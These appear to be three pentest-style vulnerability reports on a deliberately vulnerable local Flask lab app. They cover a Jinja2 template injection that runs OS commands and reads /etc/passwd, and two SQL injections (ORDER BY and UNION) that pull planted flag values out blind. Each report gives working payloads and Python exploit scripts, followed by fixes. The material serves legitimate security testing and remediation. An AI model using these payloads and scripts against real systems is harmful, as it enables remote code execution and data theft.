╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Server-Side Template Injection (Jinja2) to RCE in POST /render       │
│  `tpl` parameter                                                             │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.8                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask app running at                     │
│  http://127.0.0.1:8098)                                                      │
│                                                                              │
│  Endpoint: /render                                                           │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  The `/render` endpoint passes the user-supplied form field `tpl` directly   │
│  to `flask.render_template_string`, so attacker input becomes Jinja2         │
│  template **source code** rather than data. An unauthenticated attacker can  │
│  evaluate arbitrary expressions and escape to the Python runtime, achieving  │
│  arbitrary command execution as the application user, arbitrary file read,   │
│  and disclosure of the application database.                                 │
│                                                                              │
│  Impact                                                                      │
│  **Unauthenticated remote code execution.** The attacker can run arbitrary   │
│  OS commands as the application user, read any file the process can read     │
│  (`/etc/passwd` was retrieved), and enumerate/extract the SQLite database    │
│  including the secret marker value. Demonstrated impact: `id` returned       │
│  `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`   │
│  — the process also holds `sudo` group membership, materially widening the   │
│  blast radius on a real host. Beyond this host, an attacker can pivot to     │
│  any credential or secret the process can reach, exfiltrate environment or   │
│  configuration values, or use the host as a foothold for lateral movement.   │
│  Scope-changing effects (such as actual use of `sudo` rights) were not       │
│  exercised and are not scored.                                               │
│                                                                              │
│  Technical Analysis                                                          │
│  The route handler reads the raw form value and hands it straight to         │
│  Jinja2's `render_template_string`, which compiles the string as a           │
│  template:                                                                   │
│                                                                              │
│  ```python title=app.py startLineNumber=39 endLineNumber=43                  │
│  @app.route("/render", methods=["POST"])                                     │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│  ```                                                                         │
│                                                                              │
│  Because the template *source* is attacker-controlled, every construct of    │
│  the Jinja2 expression language is available. Flask injects `config`,        │
│  `request`, `self`, and the standard Jinja2 globals (`cycler`, `lipsum`,     │
│  `namespace`, `url_for`, `get_flashed_messages`) into the template context.  │
│  The `cycler` global is a Python callable, and                               │
│  `cycler.__init__.__globals__` exposes the module globals of                 │
│  `jinja2.utils`, which include the `os` module — a direct route to           │
│  `os.popen()` without needing the longer `__subclasses__()` walk.            │
│                                                                              │
│  Progression observed:                                                       │
│  1. `{{7*7}}` returned `49` and `{{7*8}}` returned `56`, proving the string  │
│  is parsed and evaluated by the engine rather than echoed.                   │
│  2. `{{config}}` returned the full serialized Flask configuration object.    │
│  3. `{{cycler.__init__.__globals__.os.popen('id').read()}}` returned         │
│  command output.                                                             │
│  4.                                                                          │
│  `{{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()[:20  │
│  0]}}` returned file contents.                                               │
│                                                                              │
│  Note that although the file's module docstring claims the sink is Mako,     │
│  the import on line 9 is `from flask import ... render_template_string`,     │
│  which is Jinja2 — the exploit primitive is therefore the Jinja2 object      │
│  graph.                                                                      │
│                                                                              │
│  The correct fix is structural: user data must never be the template         │
│  source. A constant, developer-defined template must be used with the user   │
│  value passed in as a context *variable*, which Jinja2 then renders as data  │
│  (and auto-escapes). The suggested patch does exactly that.                  │
│                                                                              │
│  PoC Description                                                             │
│  1. Establish a baseline by posting ordinary text to the form field: `POST   │
│  /render` with body `tpl=hello world` returns `hello world`, confirming the  │
│  field is reflected and rendered.                                            │
│  2. Send an arithmetic expression as the field value: `tpl={{7*7}}` returns  │
│  `49`; `tpl={{7*8}}` returns `56`. This proves the value is compiled and     │
│  evaluated by the template engine rather than output literally.              │
│  3. Confirm access to framework objects: `tpl={{config}}` returns the        │
│  serialized Flask configuration object.                                      │
│  4. Escalate to command execution with the object-graph chain                │
│  `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}`; the response   │
│  contains `uid=1000(pentester) gid=1000(pentester)                           │
│  groups=1000(pentester),27(sudo)`.                                           │
│  5. Confirm arbitrary command execution and the working directory with       │
│  `tpl={{cycler.__init__.__globals__.os.popen('uname -a; whoami;              │
│  pwd').read()}}`.                                                            │
│  6. Confirm arbitrary file read with                                         │
│  `tpl={{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()  │
│  [:200]}}`.                                                                  │
│  7. Confirm data disclosure by running `strings /tmp/lab/orders.db | tail    │
│  -6` through the same chain, returning the `orders` table schema and row     │
│  values.                                                                     │
│  8. The supplied script automates steps 1 through 7 and prints each request  │
│  and response pair.                                                          │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  """SSTI PoC against POST /render (form field `tpl`) on the Flask            │
│  target."""                                                                  │
│  import os                                                                   │
│  import sys                                                                  │
│                                                                              │
│  import requests                                                             │
│                                                                              │
│  BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8098"        │
│  PROXY = os.environ.get("HTTP_PROXY")                                        │
│  PROXIES = {"http": PROXY, "https": PROXY} if PROXY else None                │
│                                                                              │
│                                                                              │
│  def render(tpl, label):                                                     │
│      r = requests.post(f"{BASE}/render", data={"tpl": tpl},                  │
│  proxies=PROXIES, timeout=15)                                                │
│      print(f"--- {label} [{r.status_code}, {len(r.content)} bytes] ---")     │
│      print(tpl)                                                              │
│      print("  => " + r.text[:800].replace("\n", "\n  "))                     │
│      print()                                                                 │
│      return r                                                                │
│                                                                              │
│                                                                              │
│  render("hello", "BASELINE: static text")                                    │
│  render("{{7*7}}", "PROBE 1: arithmetic (expect 49)")                        │
│  render("{{7*8}}", "PROBE 2: arithmetic (expect 56)")                        │
│  render("{{config}}", "PROBE 3: Flask config object dumped")                 │
│  render("{{cycler.__init__.__globals__.os.popen('id').read()}}", "RCE 1:     │
│  id")                                                                        │
│  render("{{cycler.__init__.__globals__.os.popen('uname -a; whoami;           │
│  pwd').read()}}", "RCE 2: uname/whoami")                                     │
│  render(                                                                     │
│      "{{cycler.__init__.__globals__.os.popen('strings /tmp/lab/orders.db |   │
│  tail -6').read()}}",                                                        │
│      "DATA ACCESS: read the SQLite DB via shell",                            │
│  )                                                                           │
│  render(                                                                     │
│      "{{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()  │
│  [:200]}}",                                                                  │
│      "FILE READ: /etc/passwd via builtins.open",                             │
│  )                                                                           │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:43                                                     │
│    Sink: attacker-controlled string compiled as Jinja2 template source       │
│        return render_template_string(tpl)                                    │
│    Fix:                                                                      │
│    -     return render_template_string(tpl)                                  │
│    +     return render_template_string("<pre>{{ value }}</pre>", value=tpl)  │
│                                                                              │
│    Location 2: app.py:42                                                     │
│    Source: user-controlled template text                                     │
│        tpl = request.form.get("tpl", "hello")                                │
│                                                                              │
│  Remediation                                                                 │
│  Never pass user input to `render_template_string` or any function that      │
│  treats its argument as template source. Render a constant,                  │
│  developer-authored template and supply user text as a context variable so   │
│  the engine treats it strictly as data; Jinja2's autoescaping then also      │
│  neutralizes HTML in the value. Keep templates in the application's          │
│  template directory rather than in request data, and if dynamic composition  │
│  is genuinely required, restrict it to a fixed whitelist of named            │
│  placeholders and fill them with values instead of accepting template        │
│  syntax. Add a regression test asserting that a payload such as `{{7*7}}`    │
│  is returned verbatim rather than evaluated.                                 │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: SQL Injection in ORDER BY clause via GET /orders sort parameter      │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: http://127.0.0.1:8098 (Flask application, app.py)                   │
│                                                                              │
│  Endpoint: /orders                                                           │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The sort query parameter of GET /orders is interpolated directly into an    │
│  ORDER BY clause without binding or validation. An unauthenticated attacker  │
│  controls SQL syntax in that position and extracted the hidden note column   │
│  value flag{orderby_ok} character by character.                              │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker controls the SQL expression used for sorting    │
│  and can read any data reachable by the application database connection.     │
│  Demonstrated: differential row ordering proving expression control and      │
│  full blind extraction of the note column for id=1, which the endpoint       │
│  never returns.                                                              │
│                                                                              │
│  Technical Analysis                                                          │
│  The view at app.py lines 25-27 builds the statement with an f-string: sort  │
│  is read from request.args, then rows = conn.execute(f"SELECT id, sku, qty   │
│  FROM orders ORDER BY {sort}"). No allowlist, escaping or binding is         │
│  applied. The value occupies an expression position where a placeholder      │
│  cannot be used for a column name, which is why a strict allowlist is the    │
│  correct fix. CASE-based boolean oracles, correlated subselects and syntax   │
│  errors all reach the SQLite parser, enabling blind extraction.              │
│                                                                              │
│  PoC Description                                                             │
│  1. Request GET /orders?sort=id and observe the baseline rows; the note      │
│  column is never returned.                                                   │
│  2. Request GET /orders?sort=(CASE WHEN (1=1) THEN id ELSE -id END) and GET  │
│  /orders?sort=(CASE WHEN (1=2) THEN id ELSE -id END); the row order flips,   │
│  confirming control of the sort expression.                                  │
│  3. Request GET /orders?sort=id, and observe HTTP 500, confirming the        │
│  fragment is parsed as SQL.                                                  │
│  4. Run the provided script, which binary-searches each character of note    │
│  for id=1 through the CASE oracle.                                           │
│  5. Observe the recovered value flag{orderby_ok}.                            │
│                                                                              │
│  PoC Code                                                                    │
│  import requests                                                             │
│  BASE = "http://127.0.0.1:8098"                                              │
│  s = requests.Session(); s.trust_env = False                                 │
│                                                                              │
│  def sort(expr):                                                             │
│      return s.get(BASE + "/orders", params={"sort": expr}).json()            │
│                                                                              │
│  print("baseline :", sort("id"))                                             │
│  print("TRUE  1=1:", sort("(CASE WHEN (1=1) THEN id ELSE -id END)"))         │
│  print("FALSE 1=2:", sort("(CASE WHEN (1=2) THEN id ELSE -id END)"))         │
│  print("syntax err:", s.get(BASE + "/orders", params={"sort":                │
│  "id,"}).status_code)                                                        │
│                                                                              │
│  flag = ""                                                                   │
│  for pos in range(1, 33):                                                    │
│      lo, hi = 32, 126                                                        │
│      while lo < hi:                                                          │
│          mid = (lo + hi) // 2                                                │
│          pred = "(SELECT unicode(substr(note," + str(pos) + ",1)) FROM       │
│  orders WHERE id=1)<=" + str(mid)                                            │
│          rows = sort("(CASE WHEN " + pred + " THEN id ELSE -id END)")        │
│          if rows and rows[0][0] == 1:                                        │
│              hi = mid                                                        │
│          else:                                                               │
│              lo = mid + 1                                                    │
│      if lo in (32, 126):                                                     │
│          break                                                               │
│      flag += chr(lo)                                                         │
│  print("EXTRACTED:", flag)                                                   │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:25-27                                                  │
│    Allowlist the sort column and build ORDER BY only from the mapped         │
│  constant                                                                    │
│    Fix:                                                                      │
│    -     sort = request.args.get("sort", "id")                               │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {sort}").fetchall()                                                         │
│    +     sort = request.args.get("sort", "id")                               │
│      SORTABLE = {"id": "id", "sku": "sku", "qty": "qty"}                     │
│      if sort not in SORTABLE:                                                │
│          return jsonify({"error": "invalid sort"}), 400                      │
│      column = SORTABLE[sort]                                                 │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, qty FROM orders ORDER BY          │
│  {column}").fetchall()                                                       │
│                                                                              │
│  Remediation                                                                 │
│  Maintain an explicit allowlist of sortable columns and map the              │
│  user-supplied value to a developer-controlled column name (or reject        │
│  anything not in the allowlist with a 400). Never concatenate request data   │
│  into the statement, including identifier positions. If arbitrary ordering   │
│  is required, expose a small set of validated sort keys rather than raw SQL  │
│  fragments, and add regression tests that assert injection payloads are      │
│  rejected.                                                                   │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

╭─ VULN-0003 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: UNION-based SQL injection in POST /orders/by-sku sku parameter       │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 7.5                                                             │
│                                                                              │
│  Target: http://127.0.0.1:8098 (Flask application, app.py)                   │
│                                                                              │
│  Endpoint: /orders/by-sku                                                    │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The JSON field sku of POST /orders/by-sku is interpolated directly into a   │
│  single-quoted SQL string literal without binding or escaping. An            │
│  unauthenticated attacker can break out of the literal and use UNION-based   │
│  injection to read arbitrary columns and schema metadata, including the      │
│  note column containing flag{orderby_ok}.                                    │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker can read arbitrary data reachable by the        │
│  application database connection in a single request. Demonstrated: full     │
│  table dump including the note column containing flag{orderby_ok}, and       │
│  disclosure of the database schema SQL from sqlite_master. No modifier or    │
│  availability impact was demonstrated.                                       │
│                                                                              │
│  Technical Analysis                                                          │
│  The view at app.py lines 34-36 reads sku from the parsed JSON body and      │
│  builds the statement with an f-string into a single-quoted literal: rows =  │
│  conn.execute(f"SELECT id, sku, note FROM orders WHERE sku = '{sku}'"). The  │
│  request value is not escaped or bound. Because the result set contains      │
│  three columns (id, sku, note), a UNION SELECT with matching column count    │
│  returns attacker-chosen expressions in-band, and a trailing SQL comment     │
│  discards the remainder of the original statement. The same input also       │
│  supports boolean blind extraction via OR with a correlated subselect, so    │
│  extraction works even where UNION might be filtered.                        │
│                                                                              │
│  PoC Description                                                             │
│  1. Send POST /orders/by-sku with body {"sku":"alpha"} and observe the       │
│  baseline row containing the note value.                                     │
│  2. Send the same request with body {"sku":"' OR '1'='1"} and observe all    │
│  three rows returned, proving the quote terminates the literal and injects   │
│  a tautology.                                                                │
│  3. Send body {"sku":"' UNION SELECT id, note, sku FROM orders--"} to have   │
│  the note column returned in the sku position.                               │
│  4. Send body {"sku":"' UNION SELECT 1, name, sql FROM sqlite_master--"} to  │
│  dump schema SQL.                                                            │
│  5. Observe the extracted flag{orderby_ok} value and the CREATE TABLE        │
│  statement in the responses.                                                 │
│                                                                              │
│  PoC Code                                                                    │
│  import requests                                                             │
│  BASE = "http://127.0.0.1:8098"                                              │
│  s = requests.Session(); s.trust_env = False                                 │
│                                                                              │
│  def ask(sku):                                                               │
│      r = s.post(BASE + "/orders/by-sku", json={"sku": sku})                  │
│      print(r.status_code, r.text)                                            │
│      return r.json()                                                         │
│                                                                              │
│  ask("alpha")                                          # baseline:           │
│  [[1,"alpha","flag{orderby_ok}"]]                                            │
│  ask("beta")                                           # control:            │
│  [[2,"beta","nothing"]]                                                      │
│  ask("' OR '1'='1")                                    # tautology: all      │
│  rows                                                                        │
│  ask("' UNION SELECT id, note, sku FROM orders--")     # UNION: note column  │
│  exposed                                                                     │
│  ask("' UNION SELECT 1, name, sql FROM sqlite_master--")  # schema dump      │
│                                                                              │
│  out = []                                                                    │
│  for pos in range(1, 24):                                                    │
│      lo, hi = 32, 126                                                        │
│      while lo < hi:                                                          │
│          mid = (lo + hi) // 2                                                │
│          payload = "' OR (SELECT unicode(substr(note," + str(pos) + ",1))    │
│  FROM orders WHERE id=1)>" + str(mid) + "--"                                 │
│          if ask(payload):                                                    │
│              lo = mid + 1                                                    │
│          else:                                                               │
│              hi = mid                                                        │
│      if lo == 32:                                                            │
│          break                                                               │
│      out.append(chr(lo))                                                     │
│  print("BLIND EXTRACT:", "".join(out))                                       │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:34-36                                                  │
│    Bind the sku value with a parameter placeholder instead of interpolating  │
│  it                                                                          │
│    Fix:                                                                      │
│    -     sku = body.get("sku", "alpha")                                      │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute(f"SELECT id, sku, note FROM orders WHERE sku =      │
│  '{sku}'").fetchall()                                                        │
│    +     sku = body.get("sku", "alpha")                                      │
│      conn = sqlite3.connect(DB)                                              │
│      rows = conn.execute("SELECT id, sku, note FROM orders WHERE sku = ?",   │
│  (sku,)).fetchall()                                                          │
│                                                                              │
│  Remediation                                                                 │
│  Query with bound parameters instead of building SQL with f-strings or       │
│  concatenation: pass a placeholder in the statement and the user value in    │
│  the parameter tuple. Apply this to every query in the application and add   │
│  regression tests that assert injection payloads such as a single quote,     │
│  UNION SELECT, and comment sequences are treated as data. Consider running   │
│  the database connection with least-privilege credentials and enabling       │
│  SQLite query logging for detection.                                         │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯

